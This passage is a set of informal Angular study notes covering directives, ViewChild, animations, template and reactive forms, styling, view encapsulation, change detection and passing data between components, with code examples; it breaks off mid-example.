- <ng-content></ng-content>
  It acts as a placeholder for dynamic content from PARENT COMP to CHILD COMP.
  Eg:PARENT-COMP.HTML
     ------------------
      <child-comp>
  	<div>Child Component Details</div>
      </child-comp>
     CHILD-COMP.HTML
     ------------------
      <ng-content></ng-content>		// NOT REPLACE HERE, since another <ng-content></ng-content> exists
      <div>inside child</div>
      <ng-content></ng-content>         // <div>Child Component Details</div> | REPLACE HERE, since it is last <ng-content></ng-content> in file

ngDIRECTIVES
=====================
Written in html files
Three types of directives:
 1. Custom Attribute Directives
 --------------------------------
 > ng generate directive <directive_name>
 - using a @Directive decorator we can make custom attribute directive which can change appearances such as 
   text color, background color and font size of the body of an HTML element that can be called host element. 
   To change appearance angular provides ElementRef class that can directly access DOM.
 - Benefits of using custom directive
   - When we directly use ElementRef in our application, it is vulnerable to XSS (cross site scripting) attacks.
   - It is better to create a custom directive and use ElementRef inside directive to change appearance or behavior of the host element.
 - Steps
   - Create a class decorated with @Directive.
   - Assign the attribute directive name to the selector metadata of @Directive decorator, enclosed within bracket [], ex: [colorChange]
   - Create constructor of class to get instance of ElementRef by dependency injection, which can access DOM to change host element appearance and behavior
     - we can also use @HostBinding, which allows to set properties of the host element from the directive class.
     - example :  @HostBinding('style.background-color') private background = '#f5fcff';
                  @HostBinding('style.opacity') private opacity = '1';
                  @HostBinding('class.card-outline-primary') private ishovering: boolean = false;
                  /* these can be used in @HostListener() */
                  this.background = "#f00";
                  this.opacity = "0.5";
                  this.ishovering = true;
   - Use @Input() / @Output() decorator to accept or attach event to user input in our custom directive.
   - Use @HostListener() decorator to listen to events in custom attribute directive.
     - It accepts DOM event to listen for and an array which is set of arguments to pass to handler method when the event occurs.
     - example :  @HostListener('click', ['$event.target']) onClickFn(btn) { }
               :  @HostListener('dragover', ['$event']) onDragOverFn(evt) { }
   - Configure custom attribute directive class (ex: MyDirective) in respective .module.ts in the 'declarations' array metadata of @NgModule.
   // example
      @Directive({
         selector: '[colorChangeDirective]'
      })  
      export class MyDirective {
         @Input('colorChangeVAR') dynamicColor: string;
         @Input() defaultValueVAR: string; 
         
         constructor(private elRef: ElementRef) { this.defaultValueVAR = "white"; }
         
         @HostListener('mouseenter') onMouseEnterEventFunctionName() {
            this.changeBackgroundColor(this.dynamicColor || this.defaultValueVAR);
         }
         @HostListener('mouseleave') onMouseLeaveEventFunctionName() {
            this.changeBackgroundColor('white');
         }
         private changeBackgroundColor(color: string) {
            this.elRef.nativeElement.style.backgroundColor = color;
         }    
      }
      <p colorChangeDirective colorChangeVAR="yellow" defaultValueVAR="red">....Test text....</p>
 
 2. Component Directive
 -----------------------------
 Each component is itself a directive too with selector metadata provided with @Component decorator
 @Component({
    templateUrl: "",
    styleUrls: [],
    selector: "comp-selector"
 })
                                USAGE : <comp-selector> Component not available </comp-selector>
 
 3. Structural Directives
 -----------------------------
*ngIf is used for if logic while rendering HTML and *ngFor is used for loops in HTML rendering
These are Structural directives and should be prefixed with *
Reference : https://angular.io/guide/structural-directives

1. *ngIf                         // *ngIf="isValid; else other_content;"      <ng-template #other_content>isValid is false</ng-template>
                                 // *ngIf="num>10;then greater else smaller;" <ng-template #greater>num Greater 10</ng-template>
                                 //                                           <ng-template #smaller>num Smaller 10</ng-template>
                                 
2. *ngFor                        // *ngFor="let item of items; let i = index"                       // index of <item> in <items> array
                                 // *ngFor="let item of items; let i = index; trackBy:trackByFn;"   // trackBy recreates DOM by keeping track of changes specified in function
				    <input type="text" [(ngModel)]="items[i]">                         // in comp.HTML | we can make use of [(ngModel)]="ARRAY[INDEX]" , which otherwise loses focus
                                    trackByFn(index: any, item: any) { return index; }                 // in comp.TS   | instead of object references (default). 

3. [ngSwitch] , *ngSwitchCase , *ngSwitchDefault
- We assign a switch-expression to the ngSwitch via property binding syntax.
- Angular displays the inner_element only when the value of the match_expression matches the value of the switch_expression.
  If there is more than one match, then it displays all of them.
  Angular uses loose equality checks to compare ngSwitchCase expression with ngSwitch expression. 
  This means that the empty string "" matches 0. "'2'" matches "2" , "9025" matches "'9025'"   and so on ...
  Note that the ngSwitchCase does not hide the visibility of element, but removes them from DOM.
- If none of the ngSwitchCase match_expression matches the switch_expression, then the angular displays the element attached to the ngSwitchDefault.
  We can place ngSwitchDefault anywhere inside the container element and not necessarily at the bottom.
  We are free to add more than one ngSwitchDefault directive. Angular displays all of them, if none matches with switch-expression.
example:
<container_element [ngSwitch]="switch_expression">
    <inner_element *ngSwitchCase="match_expresson_1">...</inner_element>
    <inner_element *ngSwitchCase="match_expresson_2">...</inner_element>
    <inner_element *ngSwitchCase="match_expresson_3">...</inner_element>
    <inner_element *ngSwitchDefault>...</inner_element>
</container_element>



@VIEWCHILD / @VIEWCHILDREN
================================
It provides reference to HTML DOM, similar to "document.getElementById()" in core JS.
This concept can be used in following ways:-
1. Native HTML Element Reference              (Component .TS ==> <== Component .HTML)
// used ngAfterViewInit and not ngOnInit() in example as this is called when DOM/template is constructed.
// example
// component.html
   <input type='text' #nameElementReference [(ngModel)]='nameFilter' />
   <input type='text' #locationElementReference [(ngModel)]='locationFilter' />
// component.ts
   @ViewChild("nameElementReference", {static: false}) nameElementRefVAR: ElementRef;
   @ViewChildren("nameElementReference, locationElementReference") filterElementRefsVARLIST: QueryList<ElementRef>;
   ngAfterViewInit() {
      console.log(this.nameElementRefVAR);
      console.log(this.filterElementRefsVARLIST);
      this.nameElementRefVAR.nativeElement.focus();
    }

2. Angular Form/Model Reference               (Component .TS ==> <== Component .HTML)
// used for reference to form having ngForm/ngModel reference
// example
// component.ts
   @ViewChild(NgForm, {static: false}) addUserFormReferenceVAR: NgForm;              // 1. Only the first ngForm is returned.
   @ViewChild("formRef", {static: false}) addUserFormReferenceVAR: NgForm;           // specific ngForm i.e.    <form #formRef="ngForm">
                                                                                     // usage eg:- addUserFormReferenceVAR.submitted | addUserFormReferenceVAR.dirty
   @ViewChild(NgModel, {static: false}) ngmodelRefVAR: NgModel;                      // 1. Only the first ng-model is returned.
   @ViewChildren(NgModel) ngmodelsRefVARLIST: QueryList<NgModel>;                    // 2. Returns all the ng-models.
   onSubmit(formValue: any) {
      this.addUserFormReferenceVAR.reset({<NAME_ATTR_VALUE_WIDGET> : "GNDC"});       // reset is angular method , fields not specified will be set to empty
    }
    ngAfterViewInit() {
       if(this.ngmodelRefVAR.invalid) {
          if(this.ngmodelRefVAR.errors.required)  console.log("Name is required...");
          else if (this.ngmodelRefVAR.errors.minlength)  console.log(`Name must be at least 3 characters long...`);
        }
        else {
          console.log(`Current name value: ${this.ngmodelRefVAR.value} ...`);
        }
     }

3. Variable/Method Reference                  (Child Component ==> Parent Component)
// this concept is similar to @Output
// example
A) parent.html
   <p>{{employeesRefTEMPLATE.METHOD()_OR_VAR}}</p>
   <employees #employeesRefTEMPLATE></employees>
 
B) parent.ts
   @ViewChild('employeesRefTEMPLATE', {static: false}) employeesComponentRefVAR: EmployeesComponent;
C) @ViewChild(EmployeesComponent, {static: false}) employeesComponentRefVAR: EmployeesComponent;
    ngAfterViewInit(): void {
       console.log(`Logging through template reference => ${this.employeesComponentRefVAR.METHOD()_OR_VAR}`);
       console.log(`Logging through Child Component => ${this.employeesComponentRefVAR.METHOD()_OR_VAR}`);
    }
    
4. Programmatic creation of components        (Directive, Component.HTML, Component.TS)
// a generic approach can be to use *ngIf, via .HTML file
// to have it programmatically via .TS file, follow below steps
A) .directive.TS
   import { Directive, ViewContainerRef } from '@angular/core';
   @Directive({
     selector: '[adHost]',
   })
   export class AdDirective {
     constructor(public viewContainerRef: ViewContainerRef) { }        // NOTE: use of 'public'
   }
   
B) .comp.HTML
   <ng-template adHost></ng-template>

C) .comp.TS
   @ViewChild(AdDirective, {static: false}) adHost!: AdDirective;
   constructor(private componentFactoryResolver: ComponentFactoryResolver) { }
   loadDynamicComp() {
   	const componentFactory = this.componentFactoryResolver.resolveComponentFactory(dynamicComponent);
	const viewContainerRef = this.adHost.viewContainerRef;
	viewContainerRef.clear();
	
	const componentRef = viewContainerRef.createComponent<any>(componentFactory);
    	componentRef.instance.DYNAMIC_COMPs_VAR = "data value for dynamic component";
	this.subsEvent = componentRef.instance.DYNAMIC_COMPs_EVENT-EMITTER.subscribe(()=> { this.subsEvent.unsubscribe(); viewContainerRef.clear(); }); 
   }  
D) .module.TS
   declarations: [],
   imports: [],
   entryComponents: [dynamicComponent]                                 // for components that do not have any selector or route
    
NOTE: Static query with @ViewChild and @ContentChild
--------------------------------------------------------
a "static" flag dictates when that query's results should be assigned.
Starting with version 9, the static flag will default to false.
This flag only applies to @ViewChild and @ContentChild queries,
because @ViewChildren and @ContentChildren queries don't have concept of static/dynamic (they are always resolved as if they are "dynamic").
- Before Angular v9
  // query results sometimes available in `ngOnInit`, sometimes in `ngAfterViewInit` (based on template)
  @ViewChild('foo') foo: ElementRef;
- From Angular v9
  // query results available in `ngOnInit`        , result available before change detection ran for that view
  // eg: <div #foo></div>
  @ViewChild('foo', {static: true}) foo: ElementRef;
     OR
  // query results available in `ngAfterViewInit` , result not available until after change detection ran for that view
  // eg: <div #foo *ngIf="showing"></div>
  @ViewChild('foo', {static: false}) foo: ElementRef;
  
It is recommended retrieving query results in `ngAfterViewInit` for view queries and `ngAfterContentInit` for content queries.
This is because by time those lifecycle hooks run, change detection has completed for relevant nodes and we have collected all possible query results.
This setting will ensure query matches that are dependent on binding resolution (e.g. results inside *ngIf or *ngFor) will be found by the query.
However, sometimes for creating embedded views on the fly, we need access to a TemplateRef in a query to create a view dynamically,
That cannot be done in `ngAfterViewInit` as Change detection has already run on that view, 
so creating a new view with the template will cause an ExpressionHasChangedAfterChecked error to be thrown. 
In this case, you will want to set {static: true} and create your view in `ngOnInit`.


Angular Animations
=========================
From Angular 4 , animations are part of separate animations library and not part of angular core library as it was earlier.
A) app.module.TS             import BrowserAnimationsModule and write it in imports[] array
B) COMP.TS                   animations: []   metadata inside @Component({  })
import { animate, group, keyframes, state, style, transition, trigger } from '@angular/animations';
@Component({
  animations: [
    trigger('animationVar', [                       /** Name of animation */
      state('original', style({                     /** Style to apply when stateVAR value is equal to arg here */
        backgroundColor: 'blue',
        outline: '2px solid green'
      })),
      state('formatted', style({
        backgroundColor: 'green',
        outline: '2px solid blue'
      })),
      state('formatted2', style({
        backgroundColor: 'yellow',
        outline: '2px solid red'
      })),
      transition('original => formatted', [        /** =>: Apply style, as per change direction & duration specified, not immediately */
        animate(1000)
      ]),
      transition('formatted => formatted2', [
        animate(1000)
      ]),
      transition('* => void', [                   /** VOID: when element does not exist in DOM, it is in VOID state */
        group([                                   /** GROUP: runs animate funcs async i.e. both run simultaneously */
          animate(1000, style({
            backgroundColor: 'purple'
          })),
          animate(2000, style({
            transform: 'scaleY(5)',
            opacity: 0
          }))
        ])
      ]),
      transition('original <=> *', [               /** <=> : either direction  |  * : any value of stateVAR */
        style({                                    /** immediate style, when transition starts */
          transform: 'scale(2)'
        }),
        animate(5000, style({                      /** style during transition phase of stateVAR */
          transform: 'scale(5) rotate(45deg)'
        })),
        animate(2000, keyframes([                  /** KEYFRAMES: precise control during transition using offset(0-1) of duration */
          style({
            backgroundColor: 'black',
            offset: 0
          }),
          style({
            backgroundColor: 'gray',
            offset: 1
          })
        ])),
        animate(1000)                              /** duration for transition to final state after above animate duration(s) complete */
      ])
    ])
  ]
})
export class FloatingTextComponent implements OnInit {
  stateVar: any = undefined;
  show: boolean = true;	
  originalDiv() {
    this.stateVar = 'original';
  }
  formattedDiv() {
    this.stateVar = 'formatted';
  }
  formatted2Div() {
    this.stateVar = 'formatted2';
  }
  hideShowDiv() {
    this.show = this.show ? false : true;
  }
  animationStart(evt: any) {                                                           /** callbacks for animation start and done event */
    console.log(`STARTED ==> ${evt.fromState} , ${evt.toState} , ${evt.triggerName}`);
  }
  animationDone(evt: any) {
    console.log(`DONE ==> ${evt.fromState} , ${evt.toState} , ${evt.triggerName}`);
  }
}
C) comp.HTML
<div *ngIf="show" class="testDiv" 
    [@animationVar]="stateVar"
    (@animationVar.start)="animationStart($event)"
    (@animationVar.done)="animationDone($event)">
</div>
<button type="button" (click)="originalDiv()">Original</button>
<button type="button" (click)="formattedDiv()">Format</button>
<button type="button" (click)="formatted2Div()">Format 2</button>
<button type="button" (click)="hideShowDiv()">{{show ? 'Hide' : 'Show'}}</button>


Angular FORMS
===================
- These forms should support Two way data binding.
- Keep track of form state, current state is valid or not, display validation errors, enable/disable form based on validation criteria.
1. Template driven forms
   - These are used if we have fixed template to render , we already know fields that are going to be part of form.
   - import 'FormsModules' from "@angular/forms" to app.module.ts imports[] array
   - create .ts class and .html template for it.
   - use of directives ngModel, ngForm, ngModelGroup, ngSubmit.
   - validations are part of template (.html)
   - states of form input  ,  example : 1. <input #INPUT_REF="ngModel" /> 
                                        2. <form #FORM_REF="ngForm" (ngSubmit)="submitFunction(FORM_REF.value)"></form>
     INPUT_REF.pristine | INPUT_REF.dirty             // value modified    or not
     INPUT_REF.touched  | INPUT_REF.untouched         // widget is focused or not
     INPUT_REF.valid    | INPUT_REF.invalid           // value is invlaid  or not as per constraints like (required, minlength, pattern)
   - Angular provides some built-in validators for template driven forms:- required | email | maxlength | minlength | pattern
     <div *ngIf="INPUT_REF.invalid && (INPUT_REF.dirty || INPUT_REF.touched)" class="alert alert-danger">
          <div *ngIf="INPUT_REF.errors?.required">
            Description is required.
          </div>
          <div *ngIf="INPUT_REF.errors?.minlength">
            Description must be at least 3 characters long.
          </div>
     </div>
   - We may also enable HTML5 default form validation, that does show an orange alert pop up for invalid fields, by adding  `ngNativeValidate`  to input
   - set/patch value , allows us to modify values of form widgets
       @ViewChild('FORM_REF') myForm: NgForm;
       this.myForm.form.setValue({ field1: '', field2: '', ... , fieldN: '' });         // all fields must be present
       this.myForm.form.patchValue({ fieldANY: '' });                                   // any field(s) may be present
   - reset() , allows to empty form widgets and also make their states touched,valid,dirty to set to default. 
     We may also pass data to reset method, just like patchValue(), fields not specified will be set to empty.
       this.myForm.form.reset();
   
2. Model driven forms (Reactive forms)
   - These are dynamic in nature , JS/TS intensive and less HTML.
   - import 'ReactiveFormsModule' from "@angular/forms" to app.module.ts imports[] array
   - // 1. component.TS  ,   two ways of creating a formgroup
     // 1. Using FormGroup
     customerForm: FormGroup;                                      // create new FormGroup , similar to #formRef
     ngOnInit() {
        this.customerForm = new FormGroup({                        // create new FormControl for each widget in FormGroup , supports builtin validators
            <formControlName_ATTR>: new FormControl('<INITIAL_VALUE_WIDGET>', [Validators.required, Validators.minLength(3)], [this.CUSTOM_ASYNC_VALIDATOR.bind(this)]),
            <formControlName_ATTR>: new FormControl('<INITIAL_VALUE_WIDGET>', [Validators.required])
        });
        // dynamic setting/clearing of validators
        this.customerForm.get('<formControlName_ATTR>').setValidators(Validators.required);     // setValidators
        this.customerForm.get('<formControlName_ATTR>').clearValidators();                      // clearValidators
        this.customerForm.get('<formControlName_ATTR>').updateValueAndValidity();               // for set/clear to take effect
        this.customerForm.updateValueAndValidity();
     }
     // ---- OR ----
     // 2. Using FormBuilder service
     customerForm: FormGroup;                                       // create new FormGroup , similar to #formRef
     constructor(private _fb: FormBuilder) { }                      // inject FormBuilder service in class
     ngOnInit() {
        this.customerForm = this._fb.group({                        // .group method of FormBuilder service
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>', [Validators.required, Validators.minLength(3)], [this.CUSTOM_ASYNC_VALIDATOR.bind(this)]],
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>', [Validators.required]],
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>', [this.CUSTOM_VALIDATOR_FUNCTION.bind(this)]]
        });                                                               // Custom Validator function for individual formControl
                                                                             CUSTOM_VALIDATOR_FUNCTION(ctrl: FormControl|AbstractControl): { [key: string]: boolean } | null {
                                                                                if(ctrl.value.trim() == "") {
                                                                                    return {'required': true};
                                                                                }
                                                                                else if(ctrl.value.trim().length < 3) {
                                                                                    return {'minlength': true};
                                                                                }
                                                                                return null;
                                                                             }
          this.customerForm = this._fb.group({
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>', [], [this.CUSTOM_ASYNC_VALIDATOR.bind(this)]],
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>'],
           <formControlName_ATTR>: ['<INITIAL_VALUE_WIDGET>']
        }, {validator: this.CUSTOM_VALIDATOR_FUNCTION.bind(this)});
                                                                          // Custom Validator function for entire formGroup
                                                                             CUSTOM_VALIDATOR_FUNCTION(fg: FormGroup): ValidationErrors | null {
                                                                               const password = fg.controls['formControlName_ATTR'];
                                                                               const cnfpassword = fg.controls['formControlName_ATTR'];
                                                                                if(password.value.trim() == "") {
                                                                                    password.setErrors({'required': true});
                                                                                }
                                                                                if(password.value.trim() != cnfpassword.value.trim()) {
                                                                                    cnfpassword.setErrors({'CUSTOM_ERROR_NAME': true});
                                                                                }
                                                                                return null;
                                                                              }
									      
									   // Custom Async validators array(passed as third arg), allows to have asyncronous validation
									      It is useful if we need to check on input data from external API call.
									      It introduces a third state of form field as ng-pending, before giving ng-valid or ng-invalid
        
        // dynamic setting/clearing of validators
           this.customerForm.get('<formControlName_ATTR>').setValidators(Validators.required);     // setValidators
           this.customerForm.get('<formControlName_ATTR>').clearValidators();                      // clearValidators
           this.customerForm.get('<formControlName_ATTR>').updateValueAndValidity();               // for set/clear to take effect
           this.customerForm.updateValueAndValidity();
     }
     
     // set/patch/reset value to form widgets
        this.customerForm.setValue({<formControlName_ATTR>: "Google", <formControlName_ATTR>: "Australia"});     // all widgets must be supplied, else error
        this.customerForm.patchValue({<formControlName_ATTR>: "Google"});                                        // only desired can be supplied
        this.customerForm.reset();                                                         // reset data(data can be passed like patchValue()) and states touched,valid,dirty
                                                                                           // fields not specified will be set to empty
     // value/status changes subscription
        this.customerForm.valueChanges.subscribe((val: any)=> { });                        // subscribe to changes of values in form widgets
	this.customerForm.statusChanges.subscribe((val: any)=> { });                       // subscribe to changes of status(touched,valid,dirty) in form widgets
     
     // function to retrieve HTML context
        get naamValidAlertFunc() {
           return this.customerForm.get('<formControlName_ATTR>'); 
        }
     
     // submit method
        onSubmit(){                                                        // onSubmit has no arg, as Reactive forms make use of formgroup
          let newCustomer: Customer = {
            name: this.customerForm.get('<formControlName_ATTR>').value,
            location: this.customerForm.get('<formControlName_ATTR>').value,
          };
        
          // dynamic setting/clearing of validators
             this.customerForm.get('<formControlName_ATTR>').setValidators(Validators.required);     // setValidators
             this.customerForm.get('<formControlName_ATTR>').clearValidators();                      // clearValidators
             this.customerForm.get('<formControlName_ATTR>').updateValueAndValidity();               // for set/clear to take effect
             this.customerForm.updateValueAndValidity();
        
          this._customersService.addCustomer(newCustomer); 
        }
     
     // 2. component.HTML                                            // onSubmit() has no arg, as Reactive forms make use of formgroup
     <form [formGroup]="customerForm" (ngSubmit)="onSubmit()">       // [formGroup] , property binding for connecting TS form to HTML
         <input type="text" formControlName="naam" />                // formControlName , similar to HTML 'name' attr
         <div *ngIf="naamValidAlertFunc.invalid && (naamValidAlertFunc.dirty || naamValidAlertFunc.touched) && naamValidAlertFunc.errors?.required" class="alert alert-danger">Naam Required</div>
         <div *ngIf="naamValidAlertFunc.invalid && (naamValidAlertFunc.dirty || naamValidAlertFunc.touched) && naamValidAlertFunc.errors?.CUSTOM_ERROR_NAME" class="alert alert-danger">CUSTOM ERROR</div>
                                                                     // usage of angular material
         <mat-error *ngIf="(customerNameInputRef.touched || customerNameInputRef.dirty) && customerNameInputRef.errors?.required">Customer name is <b>required</b></mat-error>
         
         <select [formControlName]="['formControlName_ATTR']">
            <option *ngFor="let location of locations" [value]="location">{{location}}</option>
        </select>
     </form>
     
2.A FORM-ARRAYS
-------------------------
Reference: https://blog.angular-university.io/angular-form-array/
FormArray container is ideal when we don't know number of form controls upfront.
This happens when content of form is being defined at runtime, depending on user interaction or even backend data.
eg:
.comp.HTML
--------------
<form [formGroup]="studForm" (ngSubmit)="formSubmit()">
    <label>School: <input type="text" formControlName="school"/></label>
    <ng-container formArrayName="studsArr">
        <ng-container *ngFor="let stud of studControls; let ind=index;">
            <div [formGroupName]="ind">
                <label>Name: <input type="text" formControlName="name"/></label>
                <label>Email: <input type="email" formControlName="mail"/></label>
                <button type="button" (click)="deleteStudent(ind)">Delete</button>
            </div>
        </ng-container>
    </ng-container>
    <button type="submit" [disabled]="studForm.invalid">Submit</button>
</form>
<button type="button" (click)="addStudent()">Add Student</button>

.comp.TS
---------------
import { FormArray, FormBuilder, FormGroup, Validators } from '@angular/forms';
studForm!: FormGroup;
constructor(private _fb: FormBuilder) { }
ngOnInit(): void {
    this.studForm = this._fb.group({
      school: ['', [Validators.required, Validators.minLength(3)]],
      studsArr: this._fb.array([])
    });
}

get studControls() {
    return (this.studForm.get("studsArr") as FormArray).controls;
}

addStudent() {
    const studData = this._fb.group({
      name: ['', [Validators.required]],
      mail: ['', [Validators.required, Validators.email]]
    });
    (this.studForm.get("studsArr") as FormArray).push(studData);
}

deleteStudent(indexToDelete: number) {
    (this.studForm.get("studsArr") as FormArray).removeAt(indexToDelete);
}

formSubmit() {
    console.log(`${this.studForm.get("school")?.value}`);

    let arrayRes = this.studForm.get("studsArr") as FormArray;
    let len = arrayRes.length;
    for(let i=0; i<len; i+=1) {
      console.log(`${arrayRes.at(i).get("name")?.value}`);
      console.log(`${arrayRes.at(i).get("mail")?.value}`);
    }
}


STYLE
=================
-- A global file "styles.css" exists for entire application.
   eg:-  write   @import "https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"
   
-- :host pseudo-class selector
   To style the component custom HTML element itself, and not something inside its template.
   Use the :host pseudo-class selector to target styles in element that hosts component (as opposed to targeting elements inside component's template).
   Let's say for example that we want to style <app-demo></app-demo> component, by adding to it, for example, an extra border.
   a. PARENT_COMP.HTML
      <app-demo></app-demo>
      <app-demo class="active"></app-demo>
   b. APP-DEMO.comp.HTML
      <span> demo component </span>
   c. APP-DEMO.comp.CSS
      :host {
  	display: block;
  	border: 1px solid black;
      }
      :host(.active) {
  	border-width: 3px;
      }
   
-- :host-context pseudo-class selector
   To have a component apply a style to some element outside of it. 
   This does not happen often, but one possible common use case is for theme enabling classes.
   For example, let's say that we would like to ship a component with multiple alternative themes.
   Each theme can be enabled via adding a CSS class to a parent element OR in any ancestor of the component host element, up to the document root.
   a. PARENT_COMP.HTML
      <div class="blue-theme">
    	<themeable-button></themeable-button>
      </div>
   b. THEMEABLE-BUTTON.comp.HTML
      <button class="btn btn-theme">Themeable Button</button>
   c. THEMEABLE-BUTTON.comp.CSS
      :host-context(.red-theme) .btn-theme {
         background: red;
      }
      :host-context(.blue-theme) .btn-theme {
         background: blue;
      }

-- ::ng-deep pseudo-class selector
   It disable view encapsulation for specific CSS rules.
   It gives you access to DOM elements, which are not in your component's HTML.
   ::ng-deep is often necessary when you didn't write the component and don't have access to its source.
   For example, if you're using Angular Material (or any other third-party library like this), 
   some generated elements are outside of your component's area (such as dialog), you can use ::ng-deep syntax
  /deep/    h1{  color:red;  }      OR
  >>>       h1{  color:red;  }      OR
  ::ng-deep h1{  color:red;  }

-- CLASS BINDING
   Binding a CSS class to elements    eg:- [class.CLASS_NAME_CSS] = "Boolean_VAR_EXPRESSION"
                                           [ngClass] = "'firstCSSClass secondCSSClass'"                          // NOTE : use of '' over class names
                                           [ngClass] = "['firstCSSClass' , 'secondCSSClass']"
                                           [ngClass] = "{'firstCSSClass' : i%2==0 , 'secondCSSClass' : i%2==1}"
					   [style.left]="'15px'"
					   [style.background-color]="'blue'"
					   [style.font-size]="Boolean_VAR_EXPRESSION ? '20px' : '12px'"
					   [ngStyle] = "{'font-style' : styleVAR , 'font-weight' : 'bold'}"
					   
VIEW ENCAPSULATION
========================
View encapsulation defines whether the template and styles defined within component can affect whole application or not.
It is provided in CHILD COMPONENT's metadata.
Angular provides three encapsulation strategies:
- Emulated (default) : Angular will not create a Shadow DOM for the component, but it will only EMULATE as a Shadow DOM.
		       Hence, application also runs in browsers that do not support Shadow DOM.
		       The style will be scoped to the component only because although styles are written to document head,
		       but instead of simple .CLASS{} selector that we used, Angular creates a .CLASS[_ngcontent-1]{} selector.
- Native or ShadowDom: Native is now deprecated in favor of ShadowDOM implementation.
	   	       The reason for the change is that the Native ViewEncapsulation uses the deprecated version of ShadowDOM,
	   	       and the new one uses the current version of the standard. (For the browsers that support it).
		       Angular will create Shadow DOM for the component.
		       Styles from component along with styles from parent component are also injected inside shadow root.
		       Styles are NOT written to document head but in component’s template inside #shadow-root
- None : There is NO shadow DOM.
	 Style is not scoped to the component i.e. no style encapsulation.
	 Styles applied to our component are written to the document head and as a result component could overwrite styles to/from another component.
	 That’s why this is the unscoped strategy.
Example:
@Component({
	// ...
	encapsulation: ViewEncapsulation.None,
	styles: [
  		// ...
	]
})


CHANGE DETECTION STRATEGIES
=============================
There are 2 change detection strategy in Angular (Default and onPush)
Angular Change Detection is responsible for making the component dynamic. 
During Change Detection Cycle, Angular looks for all the bindings, re-executes all the expression, 
compares it will the previous values and if the change is detected, it propagates the change to the DOM Elements.
- Default Change Detection Strategy 
  If a component strategy is not configured, it is marked as Default.
  Example:
  Consider components i.e. ParentComponent and ChildComponent relationship.
  The Parent Component contains a property “counter”, that can be updated every time when the user clicks the button. 
  The Component is re-rendered every time the value of “counter” updates. This component also contains a Child Component. 
  The Child Component is independent of “counter” data since we are not passing data to the ChildComponent using @Input.
  In Child Component, we are not providing any Strategy inside the @Component Decorator, so it is default.
  Every time when we update counter in the ParentComponent, the ChildComponent life cycle is also triggered to re-render, making app less performant.
- onPush Change Detection Strategy
  During this Change Detection Strategy, the ChildComponent is not always dirty checked, 
  If parent element is updating values that are not passed as “@Input” properties to Child Component, then the child Component should not be dirty checked.
  OnPush itself means, only run change detection if:
  	*Reference of the @Input property has changed altogether i.e. obj={name:'name'}; | obj.name="new name"; (NOT RUN) | obj={name:'new name'}; (RUN)
	*An event has fired, like click or any of child components has emitted an event
  Example:
  @Component({
  	selector: "child-component",
  	changeDetection: ChangeDetectionStrategy.OnPush
  })
- Explicit change detection
  *Use markForCheck() if you're using OnPush strategy.
   It explicitly marks the view as changed so that it can be checked again.
   It will not run change detection, but mark its ancestors as needing to run change detection.
   Next/current cycle change detection runs, it will run also for those components which were marked.
  *Use detectChanges() when you've updated model after angular has run it's change detection,
   or if the update hasn't been in angular world at all (third party function has updated your model and you want to update the view after that)
   It will run change detection immediately from the current component down through its descendants.
  Example:
  constructor(private cdRef: ChangeDetectorRef) { }
  ngOnInit() {
    this.cdRef.markForCheck();
    this.cdRef.detectChanges();
  }
  

PASSING VARIABLES/VALUES TO and FROM COMPONENTS
=================================================
This concept is used when we have a common class for data that can be used by multiple components (child components)
-- OUTER COMPONENT (parent) to INNER COMPONENT (child)
   In child-comp.ts
   --------------------
   @Input('EXTERNAL_VAR_NAME') INTERNAL_VAR_NAME: string = "DefaultValue";
   
   In child-comp.html
   ---------------------
   {{INTERNAL_VAR_NAME}}
   
   In parent-comp.html
   ---------------------
   <child-selector-tag  [EXTERNAL_VAR_NAME] = "varFromParent.ts" > default text if child component not available </child-selector-tag>
   
NOTE: USE OF @Attribute(), when any child comp properties value is static and it will never change
      Accessing property using @Attribute() means, the value will be evaluated only once (during the first change detection) and
      it will be injected in constructor phase itself, and will not be checked on subsequent change detection cycle run of that component,
      as otherwise would happen in @Input() properties. Therefore, making performance improvised.
      In child-comp.ts
      --------------------
      constructor(@Attribute('EXTERNAL_VAR_NAME') public INTERNAL_VAR_NAME: string) { }
   
      In parent-comp.html
      ---------------------
      <child-selector-tag  EXTERNAL_VAR_NAME="VALUE_NOT_FROM-TS-FILE">VALUE here is a string, number directly passed in HTML</child-selector-tag>


-- INNER COMPONENT (child) to OUTER COMPONENT (parent)
   this is used to receive a message in parent based on an event triggered in child
   In child-comp.ts
   ----------------------
   import {EventEmitter} from '@angular/core';
   @Output() outputVarName: EventEmitter<string> = new EventEmitter<string>();
   
   functionOnEvent() {
       this.outputVarName.emit(dataToEmit);
   }
   
   In parent-comp.html
   ----------------------
   <child-selector-tag  (outputVarName)='functionReceiveMessage($event)' > default text if child component not available </child-selector-tag>
   
   In parent-comp.ts
   ----------------------
   functionReceiveMessage($event): void {
       this.DATA = $event;
   }
   
   
-- SIBLING COMPONENTS
   1. Using @Output and @Input in children and parent components, we can communicate between sibling components via parent component.
                    OR
   2. Use of EventEmitter in a service, a sibling component will subscribe to EventEmitter and another sibling will emit an event, via an injectable service.
      .service.TS
      ----------------
      import { EventEmitter, Injectable } from '@angular/core';
      @Injectable({
         providedIn: 'root'
      })
      export class TimerV2Service {
         timerValue: EventEmitter<any> = new EventEmitter<any>();
         timerStatus: EventEmitter<any> = new EventEmitter<any>();
      }
      
      COMP1.component.TS
      ----------------------
      export class TimerV2ConfigComponent implements OnInit, OnDestroy {
      	  constructor(private timerService: TimerV2Service) { }
	  
	  this.timerService.timerValue.emit(0);
	  this.timerService.timerStatus.emit("pause");
      }
      
      COMP2.component.TS
      ----------------------
      export class TimerV2Component implements OnInit {
           constructor(private timerService: TimerV2Service) { }
	   
	   ngOnInit(): void {
               this.timerService.timerValue.subscribe((count: number)=> {
               this.timerVal = count;
             },
             (err: Error)=> {
               console.log(`ERROR in receving time value ==> ${err.message}`);
             });
           }
      }
                    OR (RECOMMENDED APPROACH)
   3. Using Subject in a service
      .service.TS
      ---------------
      import { Subject } from 'rxjs';
      @Injectable({
         providedIn: 'root'
      })
      export class TimerV2Service {
          timerValue: Subject<any> = new Subject<any>();
  	  timerStatus: Subject<any> = new Subject<any>();
      }
      
      COMP1.component.TS
      ---------------------
      export class TimerV2ConfigComponent implements OnInit, OnDestroy {
      	  constructor(private timerService: TimerV2Service) { }
	  
